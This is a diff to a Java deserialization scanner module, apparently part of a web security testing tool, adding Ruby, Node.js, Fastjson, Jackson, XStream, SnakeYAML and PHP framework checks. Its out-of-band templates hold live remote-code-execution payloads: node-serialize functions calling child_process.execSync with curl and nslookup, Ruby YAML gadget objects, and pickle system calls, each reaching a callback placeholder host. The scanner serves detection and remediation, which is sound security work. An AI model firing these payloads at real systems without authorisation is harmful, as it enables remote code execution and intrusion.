+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url)
+                            .evidence("Set-Cookie value base64-decodes to PHP serialized object")
+                            .description("Server sets a cookie containing base64-encoded PHP serialized data. "
+                                    + "If unserialize() processes this cookie, it is a deserialization target.")
                             .build());
                 }
             }
@@ -734,15 +1055,23 @@ public class DeserializationScanner implements ScanModule {
         switch (dp.language) {
             case "Java":
                 activeTestJava(original, dp, url);
+                activeTestJavaSubFrameworks(original, dp, url);
                 break;
             case ".NET":
                 activeTestDotNet(original, dp, url);
                 break;
             case "PHP":
                 activeTestPhp(original, dp, url);
+                activeTestPhpFrameworks(original, dp, url);
                 break;
             case "Python":
                 activeTestPython(original, dp, url);
+                break;
+            case "Ruby":
+                activeTestRuby(original, dp, url);
+                break;
+            case "Node.js":
+                activeTestNodeJs(original, dp, url);
                 break;
         }
 
@@ -918,10 +1247,10 @@ public class DeserializationScanner implements ScanModule {
     }
 
     private void activeTestPhp(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        boolean reported500 = false;
         for (String[] payloadInfo : PHP_PAYLOADS) {
             String desc = payloadInfo[0];
             String payload = payloadInfo[1];
-
 
             HttpRequestResponse result = sendPayload(original, dp, payload);
             if (result == null || result.response() == null) continue;
@@ -929,7 +1258,7 @@ public class DeserializationScanner implements ScanModule {
             String body = result.response().bodyToString();
             int status = result.response().statusCode();
 
-            // PHP deserialization errors
+            // PHP deserialization errors — confirmed, stop immediately
             if (body.contains("unserialize()") || body.contains("__wakeup")
                     || body.contains("__destruct") || body.contains("Serializable")) {
                 findingsStore.addFinding(Finding.builder("deser-scanner",
@@ -945,13 +1274,14 @@ public class DeserializationScanner implements ScanModule {
                 return;
             }
 
-            // 500 error from modified serialized data (indicates processing)
-            if (status == 500 && dp.value != null && !dp.value.isEmpty()) {
+            // 500 error — report only ONCE, keep testing for confirmed hit
+            if (status == 500 && !reported500 && dp.value != null && !dp.value.isEmpty()) {
+                reported500 = true;
                 findingsStore.addFinding(Finding.builder("deser-scanner",
                                 "PHP Deserialization Error (500)",
                                 Severity.MEDIUM, Confidence.TENTATIVE)
                         .url(url).parameter(dp.name)
-                        .evidence("Modified PHP serialized data caused 500 error")
+                        .evidence("First trigger: " + desc + " | Modified PHP serialized data caused 500 error")
                         .description("Server error when sending modified serialized PHP data. "
                                 + "This suggests unserialize() is processing the input.")
                         .requestResponse(result)
@@ -993,6 +1323,289 @@ public class DeserializationScanner implements ScanModule {
                             .build());
                     return;
                 }
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== ACTIVE: RUBY ====================
+
+    private void activeTestRuby(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        for (String[] payloadInfo : RUBY_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            // Time-based detection
+            long baselineTime = measureTime(original, dp, dp.value);
+            long rbt2 = measureTime(original, dp, dp.value);
+            baselineTime = Math.max(baselineTime, rbt2);
+
+            long payloadTime = measureTime(original, dp, payload);
+
+            int threshold = config.getInt("deser.timeThreshold", 4000);
+            if (payloadTime >= baselineTime + threshold) {
+                long confirmTime = measureTime(original, dp, payload);
+                if (confirmTime >= baselineTime + threshold) {
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Ruby Deserialization RCE - " + desc,
+                                    Severity.CRITICAL, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
+                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
+                            .description("Ruby deserialization RCE confirmed. "
+                                    + "Remediation: Never use Marshal.load or YAML.load with untrusted data. "
+                                    + "Use JSON.parse or YAML.safe_load instead.")
+                            .build());
+                    return;
+                }
+            }
+
+            // Error-based detection
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result != null && result.response() != null) {
+                String body = result.response().bodyToString();
+                if (body.contains("Marshal") || body.contains("TypeError")
+                        || body.contains("ArgumentError") || body.contains("dump format error")
+                        || body.contains("incompatible marshal file format")
+                        || body.contains("Psych::DisallowedClass")
+                        || body.contains("Tried to load unspecified class")) {
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Ruby Deserialization Error - " + desc,
+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | Ruby Marshal/YAML error in response")
+                            .description("Ruby deserialization error triggered. The application is processing "
+                                    + "serialized data via Marshal.load or YAML.load. "
+                                    + "Remediation: Use JSON.parse or YAML.safe_load.")
+                            .requestResponse(result)
+                            .build());
+                    return;
+                }
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== ACTIVE: NODE.JS ====================
+
+    private void activeTestNodeJs(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        for (String[] payloadInfo : NODEJS_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            // Time-based detection
+            long baselineTime = measureTime(original, dp, dp.value);
+            long nbt2 = measureTime(original, dp, dp.value);
+            baselineTime = Math.max(baselineTime, nbt2);
+
+            long payloadTime = measureTime(original, dp, payload);
+
+            int threshold = config.getInt("deser.timeThreshold", 4000);
+            if (payloadTime >= baselineTime + threshold) {
+                long confirmTime = measureTime(original, dp, payload);
+                if (confirmTime >= baselineTime + threshold) {
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Node.js Deserialization RCE - " + desc,
+                                    Severity.CRITICAL, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
+                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
+                            .description("Node.js deserialization RCE confirmed. "
+                                    + "Remediation: Replace node-serialize/cryo/funcster with JSON.parse. "
+                                    + "Never deserialize untrusted data with eval or Function constructor.")
+                            .build());
+                    return;
+                }
+            }
+
+            // Error-based detection
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result != null && result.response() != null) {
+                String body = result.response().bodyToString();
+                if (body.contains("SyntaxError") || body.contains("ReferenceError")
+                        || body.contains("require is not defined")
+                        || body.contains("child_process") || body.contains("_$$ND_FUNC$$_")
+                        || body.contains("FUNCTION_PLACEHOLDER")
+                        || body.contains("Cannot read property")
+                        || body.contains("is not a function")) {
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Node.js Deserialization Error - " + desc,
+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | Node.js error in response")
+                            .description("Node.js deserialization error triggered. The application is processing "
+                                    + "serialized data via an unsafe library. "
+                                    + "Remediation: Use JSON.parse instead of node-serialize/cryo/funcster.")
+                            .requestResponse(result)
+                            .build());
+                    return;
+                }
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== ACTIVE: JAVA SUB-FRAMEWORKS ====================
+
+    private void activeTestJavaSubFrameworks(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        // Fastjson @type injection
+        for (String[] payloadInfo : JAVA_FASTJSON_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result == null || result.response() == null) { perHostDelay(); continue; }
+
+            String body = result.response().bodyToString();
+            if (body.contains("autoType") || body.contains("com.alibaba.fastjson")
+                    || body.contains("JSONException") || body.contains("not support")
+                    || body.contains("autoType is not support")
+                    || body.contains("type not match")) {
+                findingsStore.addFinding(Finding.builder("deser-scanner",
+                                "Fastjson @type Injection Detected - " + desc,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(dp.name)
+                        .evidence("Payload: " + desc + " | Fastjson error in response")
+                        .description("Fastjson is processing @type properties. Even if autoType is blocked, "
+                                + "many bypass payloads exist for older versions. "
+                                + "Remediation: Upgrade Fastjson to latest with safeMode or migrate to Gson.")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+
+        // Jackson polymorphic type injection
+        for (String[] payloadInfo : JAVA_JACKSON_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result == null || result.response() == null) { perHostDelay(); continue; }
+
+            String body = result.response().bodyToString();
+            if (body.contains("InvalidTypeIdException") || body.contains("JsonMappingException")
+                    || body.contains("InvalidDefinitionException")
+                    || body.contains("Unexpected token") || body.contains("not subtype")
+                    || body.contains("PolymorphicTypeValidator")
+                    || body.contains("Could not resolve type id")) {
+                findingsStore.addFinding(Finding.builder("deser-scanner",
+                                "Jackson Polymorphic Type Injection - " + desc,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(dp.name)
+                        .evidence("Payload: " + desc + " | Jackson error in response")
+                        .description("Jackson is processing polymorphic type data. DefaultTyping is enabled. "
+                                + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator.")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+
+        // XStream XML injection
+        for (String[] payloadInfo : JAVA_XSTREAM_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result == null || result.response() == null) { perHostDelay(); continue; }
+
+            String body = result.response().bodyToString();
+            if (body.contains("XStreamException") || body.contains("ConversionException")
+                    || body.contains("ForbiddenClassException")
+                    || body.contains("Security framework") || body.contains("not allowed")
+                    || body.contains("com.thoughtworks.xstream")) {
+                findingsStore.addFinding(Finding.builder("deser-scanner",
+                                "XStream XML Deserialization - " + desc,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(dp.name)
+                        .evidence("Payload: " + desc + " | XStream error in response")
+                        .description("XStream is processing XML serialized data. "
+                                + "Remediation: Upgrade XStream and configure security framework with allowlists.")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+
+        // SnakeYAML injection
+        for (String[] payloadInfo : JAVA_SNAKEYAML_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result == null || result.response() == null) { perHostDelay(); continue; }
+
+            String body = result.response().bodyToString();
+            if (body.contains("SnakeYaml") || body.contains("YAMLException")
+                    || body.contains("could not determine a constructor")
+                    || body.contains("Unable to find property")
+                    || body.contains("org.yaml.snakeyaml")
+                    || body.contains("Blocked by GlobalTagInspector")) {
+                findingsStore.addFinding(Finding.builder("deser-scanner",
+                                "SnakeYAML Deserialization - " + desc,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(dp.name)
+                        .evidence("Payload: " + desc + " | SnakeYAML error in response")
+                        .description("SnakeYAML is processing YAML with type tags. "
+                                + "Remediation: Use SafeConstructor or upgrade SnakeYAML 2.0+ with restricted tags.")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== ACTIVE: PHP FRAMEWORKS ====================
+
+    private void activeTestPhpFrameworks(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        boolean foundError = false;
+        for (String[] payloadInfo : PHP_FRAMEWORK_PAYLOADS) {
+            String desc = payloadInfo[0];
+            String payload = payloadInfo[1];
+
+            HttpRequestResponse result = sendPayload(original, dp, payload);
+            if (result == null || result.response() == null) { perHostDelay(); continue; }
+
+            String body = result.response().bodyToString();
+            int status = result.response().statusCode();
+
+            // Confirmed deserialization processing — report and stop immediately
+            if (body.contains("unserialize()") || body.contains("__wakeup")
+                    || body.contains("__destruct") || body.contains("Serializable")
+                    || body.contains("ErrorException") || body.contains("Allowed memory size")
+                    || body.contains("class not found") || body.contains("cannot be converted")) {
+                findingsStore.addFinding(Finding.builder("deser-scanner",
+                                "PHP Framework Deserialization - " + desc,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(dp.name)
+                        .evidence("Payload: " + desc + " | PHP deserialization error in response")
+                        .description("PHP framework deserialization chain triggered processing. "
+                                + "Remediation: Use json_decode() instead of unserialize().")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+
+            // 500 error — report only ONE generic finding, not one per chain
+            if (status == 500 && !foundError) {
+                foundError = true;
+                findingsStore.addFinding(Finding.builder("deser-scanner",
+                                "PHP Deserialization Error (500)",
+                                Severity.MEDIUM, Confidence.TENTATIVE)
+                        .url(url).parameter(dp.name)
+                        .evidence("First trigger: " + desc + " | 500 error from modified serialized data")
+                        .description("Server error from PHP deserialization chain. "
+                                + "Confirms unserialize() is processing user input. "
+                                + "Multiple framework chains tested.")
+                        .requestResponse(result)
+                        .build());
+                // Don't return — keep testing for confirmed deserialization,
+                // but don't report more 500s
             }
             perHostDelay();
         }
@@ -1068,6 +1681,37 @@ public class DeserializationScanner implements ScanModule {
                 oobTemplateList.add(new String[]{"cos\nsystem\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle nslookup"});
                 oobTemplateList.add(new String[]{"cos\nsystem\n(S'curl http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle curl"});
                 oobTemplateList.add(new String[]{"cos\nsystem\n(S'wget http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle wget"});
+                break;
+            case "Ruby":
+                // Ruby YAML-based OOB (!!ruby/object ERB template executing nslookup)
+                oobTemplateList.add(new String[]{
+                        "--- !ruby/object:Gem::Installer\ni: !ruby/object:Gem::SpecFetcher\ni: !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: http://COLLAB_PLACEHOLDER/ruby",
+                        "Ruby YAML Gem OOB"});
+                oobTemplateList.add(new String[]{
+                        "--- !ruby/hash:Net::FTP\nhost: COLLAB_PLACEHOLDER\nport: 80",
+                        "Ruby YAML Net::FTP OOB"});
+                oobTemplateList.add(new String[]{
+                        "--- !ruby/object:OpenURI::OpenRead\nuri: http://COLLAB_PLACEHOLDER/rb",
+                        "Ruby YAML OpenURI OOB"});
+                break;
+            case "Node.js":
+                // node-serialize with require('http') OOB
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){var http=require('http');"
+                                + "http.get('http://COLLAB_PLACEHOLDER/node')}()\"}",
+                        "node-serialize HTTP OOB"});
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
+                                + ".execSync('nslookup COLLAB_PLACEHOLDER')}()\"}",
+                        "node-serialize nslookup OOB"});
+                oobTemplateList.add(new String[]{
+                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
+                                + ".execSync('curl http://COLLAB_PLACEHOLDER/node2')}()\"}",
+                        "node-serialize curl OOB"});
+                oobTemplateList.add(new String[]{
+                        "{\"__cryo_type__\":\"Function\","
+                                + "\"body\":\"return require('http').get('http://COLLAB_PLACEHOLDER/cryo')\"}",
+                        "cryo HTTP OOB"});
                 break;
             default:
                 break;
@@ -1190,6 +1834,300 @@ public class DeserializationScanner implements ScanModule {
             if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
         } catch (Exception ignored) {}
         return url;
+    }
+
+    /**
+     * Attempts to base64-decode a value (standard, URL-safe, and URL-encoded variants).
+     * Handles real-world cases where apps URL-encode base64 padding (e.g. %3d%3d for ==)
+     * or use + encoded as %2b, / as %2f, etc.
+     * Returns the decoded string (ISO-8859-1 to preserve all bytes) or null.
+     */
+    private String tryBase64Decode(String value) {
+        if (value == null || value.length() < 4) return null;
+        String cleaned = value.trim();
+
+        // Try raw value first (fastest path)
+        String result = tryBase64DecodeRaw(cleaned);
+        if (result != null) return result;
+
+        // URL-decode then retry — catches %3d%3d (==), %2b (+), %2f (/), %3d (=)
+        if (cleaned.contains("%")) {
+            try {
+                String urlDecoded = java.net.URLDecoder.decode(cleaned, StandardCharsets.UTF_8);
+                if (!urlDecoded.equals(cleaned)) {
+                    result = tryBase64DecodeRaw(urlDecoded.trim());
+                    if (result != null) return result;
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // Handle mixed: some apps double-encode or use non-standard padding
+        // Strip trailing whitespace/newlines and retry
+        String stripped = cleaned.replaceAll("[\\r\\n\\s]+", "");
+        if (!stripped.equals(cleaned)) {
+            result = tryBase64DecodeRaw(stripped);
+            if (result != null) return result;
+        }
+
+        return null;
+    }
+
+    /** Raw base64 decode attempt — standard then URL-safe alphabet. */
+    private String tryBase64DecodeRaw(String value) {
+        try {
+            byte[] decoded = Base64.getDecoder().decode(value);
+            if (decoded.length >= 2) return new String(decoded, StandardCharsets.ISO_8859_1);
+        } catch (Exception ignored) {}
+        try {
+            byte[] decoded = Base64.getUrlDecoder().decode(value);
+            if (decoded.length >= 2) return new String(decoded, StandardCharsets.ISO_8859_1);
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    /**
+     * URL-decodes a value. Returns null if decoding fails or the result is identical to input.
+     */
+    private String tryUrlDecode(String value) {
+        if (value == null || !value.contains("%")) return null;
+        try {
+            String decoded = java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
+            return decoded.equals(value) ? null : decoded;
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    /**
+     * Scans a string value against ALL language deserialization patterns.
+     * Returns a list of detected DeserPoints. Used to avoid duplicating pattern checks
+     * for raw, URL-decoded, and base64-decoded values.
+     *
+     * @param text       The text to scan (could be raw, URL-decoded, or base64-decoded)
+     * @param location   Where this value came from (cookie, header, body_param, url_param, body)
+     * @param name       Parameter/cookie/header name
+     * @param url        Target URL
+     * @param encoding   "none", "urldecoded", "base64", "urldecoded+base64"
+     * @param findings   List to append passive findings to
+     * @return           List of DeserPoints found
+     */
+    private List<DeserPoint> scanForAllPatterns(String text, String location, String name,
+                                                 String url, String encoding, List<Finding> findings) {
+        List<DeserPoint> found = new ArrayList<>();
+        if (text == null || text.length() < 3) return found;
+
+        String encodingLabel = "none".equals(encoding) ? "" : " (" + encoding + ")";
+
+        // Java core
+        if (JAVA_MAGIC_BYTES_B64.matcher(text).find() || JAVA_MAGIC_BYTES_HEX.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "Java serialized object" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Java serialized data in " + location + encodingLabel, "Java",
+                    "Java serialization bytes in " + location + " '" + name + "'");
+        }
+        // PHP
+        if (PHP_SERIALIZED.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "PHP",
+                    "PHP serialized" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "PHP serialized data in " + location + encodingLabel, "PHP",
+                    "PHP serialized pattern in " + location + " '" + name + "': "
+                            + text.substring(0, Math.min(80, text.length())));
+        }
+        // Python pickle
+        if (PYTHON_PICKLE_B64.matcher(text).find() || PYTHON_PICKLE_V2.matcher(text).find()
+                || isPythonTextPickle(text)) {
+            found.add(new DeserPoint(location, name, text, "Python",
+                    "Python pickle" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Python pickle in " + location + encodingLabel, "Python",
+                    "Pickle data in " + location + " '" + name + "'");
+        }
+        // Python jsonpickle
+        if (PYTHON_JSONPICKLE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Python",
+                    "Python jsonpickle" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Python jsonpickle in " + location + encodingLabel, "Python",
+                    "jsonpickle markers in " + location + " '" + name + "'");
+        }
+        // .NET BinaryFormatter
+        if (DOTNET_BINARY_B64.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, ".NET",
+                    ".NET BinaryFormatter" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    ".NET BinaryFormatter in " + location + encodingLabel, ".NET",
+                    ".NET BinaryFormatter in " + location + " '" + name + "'");
+        }
+        // .NET JSON $type
+        if (DOTNET_DOLLAR_TYPE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, ".NET",
+                    "JSON.NET $type" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "JSON.NET $type in " + location + encodingLabel, ".NET",
+                    "$type property in " + location + " '" + name + "'");
+        }
+        // .NET SOAP
+        if (DOTNET_SOAP_ENVELOPE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, ".NET",
+                    "SOAP envelope" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "SOAP envelope in " + location + encodingLabel, ".NET",
+                    "SOAP envelope in " + location + " '" + name + "'");
+        }
+        // Ruby Marshal
+        if (RUBY_MARSHAL_B64.matcher(text).find() || RUBY_MARSHAL_HEX.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Ruby",
+                    "Ruby Marshal" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Ruby Marshal in " + location + encodingLabel, "Ruby",
+                    "Ruby Marshal data in " + location + " '" + name + "'");
+        }
+        // Ruby YAML
+        if (RUBY_YAML_UNSAFE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Ruby",
+                    "Ruby YAML" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Ruby unsafe YAML in " + location + encodingLabel, "Ruby",
+                    "Ruby YAML tags in " + location + " '" + name + "'");
+        }
+        // Node.js
+        if (NODE_SERIALIZE.matcher(text).find() || NODE_SERIALIZE_IIFE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Node.js",
+                    "node-serialize" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Node.js node-serialize in " + location + encodingLabel, "Node.js",
+                    "_$$ND_FUNC$$_ in " + location + " '" + name + "'");
+        }
+        if (NODE_CRYO.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Node.js",
+                    "cryo" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Node.js cryo in " + location + encodingLabel, "Node.js",
+                    "__cryo_type__ in " + location + " '" + name + "'");
+        }
+        if (NODE_FUNCSTER.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Node.js",
+                    "funcster" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Node.js funcster in " + location + encodingLabel, "Node.js",
+                    "__js_function in " + location + " '" + name + "'");
+        }
+        if (NODE_JS_YAML.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Node.js",
+                    "js-yaml" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Node.js js-yaml in " + location + encodingLabel, "Node.js",
+                    "!!js/function tag in " + location + " '" + name + "'");
+        }
+        // Java Fastjson
+        if (JAVA_FASTJSON_TYPE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "Fastjson @type" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Fastjson @type in " + location + encodingLabel, "Java",
+                    "Fastjson @type in " + location + " '" + name + "'");
+        }
+        // Java Jackson
+        if (JAVA_JACKSON_POLY.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "Jackson polymorphic" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Jackson polymorphic in " + location + encodingLabel, "Java",
+                    "Jackson DefaultTyping in " + location + " '" + name + "'");
+        }
+        // Java XStream
+        if (JAVA_XSTREAM_XML.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "XStream XML" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "XStream XML in " + location + encodingLabel, "Java",
+                    "XStream XML tags in " + location + " '" + name + "'");
+        }
+        // Java SnakeYAML
+        if (JAVA_SNAKEYAML_TAG.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "SnakeYAML" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "SnakeYAML in " + location + encodingLabel, "Java",
+                    "SnakeYAML tags in " + location + " '" + name + "'");
+        }
+        // Java Hessian content-type
+        if (JAVA_HESSIAN_CONTENT_TYPE.matcher(text).find()) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "Hessian" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Hessian content-type in " + location + encodingLabel, "Java",
+                    "Hessian serialization in " + location + " '" + name + "'");
+        }
+
+        return found;
+    }
+
+    /**
+     * Convenience: scan a value in all forms — raw, URL-decoded, and base64-decoded.
+     * Deduplicates by only checking decoded forms for patterns NOT already found in raw.
+     */
+    private List<DeserPoint> scanValueAllEncodings(String rawValue, String location, String name,
+                                                    String url, List<Finding> findings) {
+        List<DeserPoint> all = new ArrayList<>();
+        Set<String> foundLangs = new HashSet<>();
+
+        // 1. Raw
+        List<DeserPoint> raw = scanForAllPatterns(rawValue, location, name, url, "none", findings);
+        all.addAll(raw);
+        for (DeserPoint dp : raw) foundLangs.add(dp.language + ":" + dp.indicator);
+
+        // 2. URL-decoded
+        String urlDecoded = tryUrlDecode(rawValue);
+        if (urlDecoded != null) {
+            List<DeserPoint> urlFindings = scanForAllPatterns(urlDecoded, location, name, url, "urldecoded", findings);
+            for (DeserPoint dp : urlFindings) {
+                if (!foundLangs.contains(dp.language + ":" + dp.indicator)) {
+                    all.add(new DeserPoint(location, name, rawValue, dp.language, dp.indicator, "urldecoded"));
+                    foundLangs.add(dp.language + ":" + dp.indicator);
+                }
+            }
+        }
+
+        // 3. Base64-decoded (tryBase64Decode already handles URL-decode → base64)
+        String b64Decoded = tryBase64Decode(rawValue);
+        if (b64Decoded != null) {
+            String enc = (urlDecoded != null && rawValue.contains("%")) ? "urldecoded+base64" : "base64";
+            List<DeserPoint> b64Findings = scanForAllPatterns(b64Decoded, location, name, url, enc, findings);
+            for (DeserPoint dp : b64Findings) {
+                if (!foundLangs.contains(dp.language + ":" + dp.indicator)) {
+                    all.add(new DeserPoint(location, name, rawValue, dp.language, dp.indicator, "base64"));
+                    foundLangs.add(dp.language + ":" + dp.indicator);
+                }
+            }
+        }
+
+        return all;
+    }
+
+    /**
+     * Detects Python text-based pickle (protocol 0/1) which has no binary header prefix.
+     * These are missed by the PYTHON_PICKLE_B64 / PYTHON_PICKLE_V2 prefix checks.
+     */
+    private boolean isPythonTextPickle(String text) {
+        if (text == null || text.length() < 4) return false;
+        return text.startsWith("cos\n") || text.startsWith("cposix\n")
+                || text.startsWith("c__builtin__\n") || text.startsWith("cnt\n")
+                || text.startsWith("(dp0\n") || text.startsWith("(lp0\n")
+                || (text.startsWith("(") && text.contains("\ntR"))
+                || text.contains("!!python/object");
+    }
+
+    /**
+     * Returns true if the payload already looks like base64-encoded binary data.
+     * Used to avoid double-encoding when injecting into base64-wrapped injection points.
+     * Java gadget chains, Python pickle, and .NET BinaryFormatter payloads are already base64.
+     * PHP serialized strings (O:8:...), JSON ($type), and XML payloads are raw text → need wrapping.
+     */
+    private boolean isAlreadyBase64(String payload) {
+        return payload != null && payload.length() >= 16 && payload.matches("[A-Za-z0-9+/=\\-_]+");
     }
 
     private void perHostDelay() throws InterruptedException {
